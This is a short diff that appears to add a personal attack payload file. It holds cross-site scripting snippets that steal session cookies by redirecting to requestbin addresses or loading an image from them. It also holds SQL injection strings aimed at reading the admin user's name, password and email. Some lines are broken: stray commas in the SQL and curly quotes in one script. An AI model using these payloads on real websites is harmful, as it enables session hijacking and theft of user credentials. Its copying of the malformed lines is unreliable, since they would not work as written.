@@ -1,0 +1,15 @@
+<script> window.location.replace("http://requestbin.fullcontact.com/19dxaj21/" + document.cookie); </script>
+
+
+<script>document.write(“<img src=’your host url?=”+document.cookie+”‘></img>”);</script>
+<script>document.write("<img src='http://requestbin.fullcontact.com/19dxaj21?="+document.cookie+"'></img>");</script>
+
+<script>document.write("<img src=http://requestbin.fullcontact.com/xpv41rxp/"+document.cookie+"/>");</script>
+
+' select username from, users where username = ''admin'''
+
+' select password from, users where name = ''admin'''
+
+' select email from, users where name = ''admin'''
+
+' select password from, users where name = ''admin'''
